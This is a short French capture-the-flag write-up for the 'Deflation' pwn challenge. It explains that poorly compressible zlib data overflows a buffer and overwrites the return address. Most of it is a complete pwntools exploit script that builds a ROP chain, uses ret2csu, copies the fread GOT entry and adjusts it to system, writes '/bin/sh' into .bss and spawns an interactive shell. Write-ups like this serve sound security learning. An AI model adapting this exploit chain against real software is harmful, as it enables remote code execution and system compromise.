#### Deflation

était un challenge de pwn où un bloc de donnée compressé avec zlib,

causait un overflow permettant d'écrase l'addresse de retour.

En envoyant des données peu compressibles, on déborde aisément sur l'addresse de retour.

Le binaire étant non-PIE il suffit donc de retourner sur la fonction de lecture pour lire un ROP plus conséquent..

et avoir un shell

comme dans l'exploit donc..

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./deflation_patched")
libc = ELF("./libc.so.6")


host, port = "challenges.france-cybersecurity-challenge.fr", "2055"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

pop_rdi = 0x00000000004012eb # pop rdi ; ret
pop_rsi = 0x00000000004012e9 # pop rsi ; pop r15 ; ret
gadget_add = 0x0000000000401198  # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
gadget_set = 0x0000000000401289  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
set_csu = 0x4012e2  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14; pop r15; ret
call_csu = 0x4012c8 # mov rdx,r14 ; mov rsi,r13 ; mov edi, r12d ; call qword[r15+rbx*8] ; +7 pop

memcpy = exe.sym['memcpy']
def add_gadget(address, val):
  global gadget_set
  global gadget_add
  return p64(gadget_set)+p64(val & 0xffffffff)+p64(address+0x3d)+p64(0)*2+p64(gadget_add)

buff = b''

# données peu compressibles car sans répétitions..
for i in range(0,249,1):
  buff += chr((i+66)%256)
buff += p64(0x401096)[0:7]		# address de retour écrasée
if (len(buff)<256):
  buff = buff.ljust(256,'\x00')

# next payload
payload = p64(0x4011b0)*33
# write ret gadget to 0x404a00 .bss address
payload += add_gadget(0x404a00, 0x4012f0)
# set registers rdi,rsi,rdx, for memcpy
payload += p64(set_csu)+p64(0)+p64(1)+p64(0x404a08)+p64(exe.got['fread'])+p64(8)+p64(0x404a00)
# copy fread GOT entry to 0x404a08 .bss address with memcpy
payload += p64(call_csu)+p64(0)*7+p64(memcpy)
payload += add_gadget(0x404a08, (libc.sym['system']-libc.sym['fread']) )
payload += add_gadget(0x404a10, u32('/bin'))
payload += add_gadget(0x404a14, u32('/sh\x00'))
payload += p64(set_csu)+p64(0)+p64(1)+p64(0x404a10)+p64(0)+p64(0)+p64(0x404a08)
payload += p64(call_csu)+p64(0)*7
payload = payload.ljust(0x20000,'\x00')
p.send(buff+payload)

p.interactive()

```
